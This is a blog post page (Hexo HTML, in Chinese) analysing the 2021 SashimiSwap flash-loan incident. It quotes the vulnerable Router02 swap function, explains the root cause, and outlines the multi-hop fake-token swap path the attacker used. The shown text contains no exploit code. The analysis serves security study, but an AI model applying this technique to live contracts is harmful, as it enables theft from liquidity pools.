@@ -1,0 +1,1272 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Chiu">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/06/20/sashimi swap incident & poc/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+        
+        <meta name="description" content="1. 背景21年12月，DEX SashimiSwap遭受闪电贷攻击，SashimiSwap是一个基于Uniswap V2 fork的交易所，攻击者通过闪电贷和构造特殊的swap路径，攻击了Router02合约中的swap逻辑漏洞。 2. 漏洞根本原因分析2.1 Root cause函数在计算输出量时，swap前后Router通过getTokenInPair(pair, WETH)获取交易对中WE">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SashimiSwap Incident &amp; POC">
+<meta property="og:url" content="http://example.com/2025/06/20/Sashimi%20Swap%20Incident%20&%20POC/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="1. 背景21年12月，DEX SashimiSwap遭受闪电贷攻击，SashimiSwap是一个基于Uniswap V2 fork的交易所，攻击者通过闪电贷和构造特殊的swap路径，攻击了Router02合约中的swap逻辑漏洞。 2. 漏洞根本原因分析2.1 Root cause函数在计算输出量时，swap前后Router通过getTokenInPair(pair, WETH)获取交易对中WE">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/Sashimi%20swap.png">
+<meta property="article:published_time" content="2025-06-20T02:36:41.000Z">
+<meta property="article:modified_time" content="2025-07-15T10:25:08.585Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="区块链">
+<meta property="article:tag" content="DeFi">
+<meta property="article:tag" content="攻击事件分析">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/Sashimi%20swap.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            SashimiSwap Incident &amp; POC | Chiu&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":true,"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Input | Think | Output","subtitle":{"text":["How you spend every day is how you spend your life"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/Idealist17","instagram":null,"zhihu":null,"twitter":null,"email":"ChiuFangxi@gmail.com"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.8.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Gallery":{"icon":"fa-solid fa-image","path":"/masonry/"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Friends":"/friends"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"Input | Think | Output","show_on_mobile":true,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"}}},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/7/30 14:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":true};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        Chiu&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Chiu&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/archives"
+                                        >
+                                    <i class="fa-regular fa-archive fa-fw"></i>
+                                    ARCHIVES
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/masonry/"
+                                        >
+                                    <i class="fa-solid fa-image fa-fw"></i>
+                                    GALLERY
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown"
+                                   href="#"
+                                        onClick=&#34;return false;&#34;>
+                                    <i class="fa-regular fa-user fa-fw"></i>
+                                    ABOUT
+                                    <i class="fa-solid fa-chevron-down fa-fw"></i>
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                        
+                                            <li>
+                                                <a href="/about">
+                                                    ME
+                                                </a>
+                                            </li>
+                                        
+                                            <li>
+                                                <a href="/friends">
+                                                    FRIENDS
+                                                </a>
+                                            </li>
+                                        
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/archives"
+                        >
+                            <span>
+                                ARCHIVES
+                            </span>
+                            
+                                <i class="fa-regular fa-archive fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/masonry/"
+                        >
+                            <span>
+                                GALLERY
+                            </span>
+                            
+                                <i class="fa-solid fa-image fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item-sub text-base my-1.5 flex flex-col w-full">
+                        
+                        <div class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary cursor-pointer text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                             navbar-data-toggle="submenu-About"
+                        >
+                            <span>
+                                ABOUT
+                            </span>
+                            
+                                <i class="fa-solid fa-chevron-right fa-sm fa-fw transition-all"></i>
+                            
+                        </div>
+                        
+
+                        
+                            <div class="flex-col items-start px-2 py-2 hidden" data-target="submenu-About">
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/about">ME</a>
+                                    </div>
+                                
+                                    <div class="drawer-navbar-item text-base flex flex-col justify-center items-start hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                        <a class=" text-third-text-color text-xl"
+                                           href="/friends">FRIENDS</a>
+                                    </div>
+                                
+                            </div>
+                        
+                    </li>
+            
+
+            
+            
+                
+                    
+                    
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
+                           href="/tags"
+                        >
+                            <span>Tags</span>
+                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
+                        </a>
+                    </li>
+                
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">22</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">35</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">SashimiSwap Incident &amp; POC</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">Chiu</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-06-20 10:36:41</span>
+        <span class="mobile">2025-06-20 10:36:41</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-07-15 18:25:08</span>
+            <span class="mobile">2025-07-15 18:25:08</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/DeFi/">DeFi</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/">攻击事件分析</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h2 id="1-背景"><a href="#1-背景" class="headerlink" title="1. 背景"></a>1. 背景</h2><p>21年12月，DEX SashimiSwap遭受闪电贷攻击，SashimiSwap是一个基于Uniswap V2 fork的交易所，攻击者通过闪电贷和构造特殊的swap路径，攻击了Router02合约中的swap逻辑漏洞。</p>
+<h2 id="2-漏洞根本原因分析"><a href="#2-漏洞根本原因分析" class="headerlink" title="2. 漏洞根本原因分析"></a>2. 漏洞根本原因分析</h2><h3 id="2-1-Root-cause"><a href="#2-1-Root-cause" class="headerlink" title="2.1 Root cause"></a><strong>2.1 Root cause</strong></h3><p>函数在计算输出量时，swap前后Router通过<code>getTokenInPair(pair, WETH)</code>获取交易对中WETH的余额来计算WETH变化，但它<strong>总是使用第一个pair的WETH记录，没有考虑到path中后续的pair</strong></p>
+<h3 id="2-2-Contributing-factors-："><a href="#2-2-Contributing-factors-：" class="headerlink" title="2.2 Contributing factors ："></a><strong>2.2 Contributing factors ：</strong></h3><p>sashimi swap的router中心化管理所有pair的资产，且通过_pool[pair][token] 这样的虚拟余额映射来记录资产归属</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mapping(address =&gt; mapping(address =&gt; uint)) </span><br><span class="line">private _pools;</span><br></pre></td></tr></table></figure></div>
+
+<p>转账方式：</p>
+<p>直接转到address(this) （router合约） ，更新虚拟余额映射</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function _transferIn(address from, address pair, address token, uint amount) internal &#123;</span><br><span class="line">    TransferHelper.safeTransferFrom(token, from, address(this), amount);</span><br><span class="line">    _pools[pair][token] = _pools[pair][token].add(amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>这种中心化设计模式使Router拥有过高的资金控制权，Router合约漏洞可以危害到资金池</p>
+<h3 id="2-3-核心漏洞位置"><a href="#2-3-核心漏洞位置" class="headerlink" title="2.3 核心漏洞位置"></a>2.3 核心漏洞位置</h3><p>漏洞存在于SashimiSwap的Router02合约中的<code>swapExactTokensForETHSupportingFeeOnTransferTokens</code>函数：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function swapExactTokensForETHSupportingFeeOnTransferTokens(</span><br><span class="line">        uint amountIn,</span><br><span class="line">        uint amountOutMin,</span><br><span class="line">        address[] calldata path,</span><br><span class="line">        address to,</span><br><span class="line">        uint deadline</span><br><span class="line">    ) external virtual override ensure(deadline) &#123;</span><br><span class="line">        //</span><br><span class="line">        require(path[path.length - 1] == WETH, &quot;UniswapV2Router: INVALID_PATH&quot;);</span><br><span class="line">        </span><br><span class="line">        //开发者只考虑到了token换weth的单一pair路径，计算pair时只使用了path的第一对</span><br><span class="line">        address pair = UniswapV2Library.pairFor(factory, path[0], path[1]);</span><br><span class="line">        </span><br><span class="line">        _transferIn(msg.sender, pair, path[0], amountIn);</span><br><span class="line">        uint balanceBefore = getTokenInPair(pair, WETH);</span><br><span class="line">        _swapSupportingFeeOnTransferTokens(path, address(this));</span><br><span class="line">        uint balanceAfter = getTokenInPair(pair, WETH);</span><br><span class="line">        </span><br><span class="line">        //转给exp的weth数量为pair1内weth前后之差</span><br><span class="line">        uint amountOut = balanceBefore.sub(balanceAfter); </span><br><span class="line">        </span><br><span class="line">        require(</span><br><span class="line">            amountOut &gt;= amountOutMin,</span><br><span class="line">            &quot;UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT&quot;</span><br><span class="line">        );</span><br><span class="line">        _transferETH(to, amountOut);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="中心化下正确的swap逻辑"><a href="#中心化下正确的swap逻辑" class="headerlink" title="中心化下正确的swap逻辑"></a>中心化下正确的swap逻辑</h3><p>在正常情况下，router应该以router自己的余额变化为准 <code>swapExactTokensForETHSupportingFeeOnTransferTokens</code>函数应该：</p>
+<ul>
+<li>记录swap前router的WETH余额（<code>balanceBefore</code>）</li>
+<li>执行path上所有swap</li>
+<li>记录swap后router的WETH余额（<code>balanceAfter</code>）</li>
+<li>计算router实际的WETH变化量：<code>amountOut = balanceAfter - balanceBefore</code></li>
+<li>router发给swap发起者amountOut量的ETH</li>
+</ul>
+<h3 id="2-4-漏洞利用"><a href="#2-4-漏洞利用" class="headerlink" title="2.4 漏洞利用"></a>2.4 漏洞利用</h3><p>构造这样一个交易路径：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FakeToken1 → WETH → FakeToken2 → FakeToken3 → WETH</span><br></pre></td></tr></table></figure></div>
+
+<ul>
+<li>存在校验，path最后一个token必须是WETH</li>
+<li>为了尽可能多地把注入的WETH留在可控的池子内，所以中间构造了两个[1 ether, 1 ether]的低流动性池子来留住WETH</li>
+<li>函数错误地使用第一个交易对（FakeToken1-WETH）的WETH余额变化来计算最终的ETH输出量</li>
+</ul>
+<p><strong>此时最后一步swap流出pair4的WETH很少（注：最后一个pair的swap不会把输出发给用户，而是发给router自己，也就是从pair的虚拟余额映射中移出）</strong></p>
+<p>而router基于第一个pair的WETH变化，计算出错误的输出量</p>
+<p>结果就是router在攻击下会转给攻击者超额的token</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://blog-1301216421.cos.ap-chengdu.myqcloud.com/Sashimi%20swap.png"
+                      alt="Sashimi swap.png"
+                ></p>
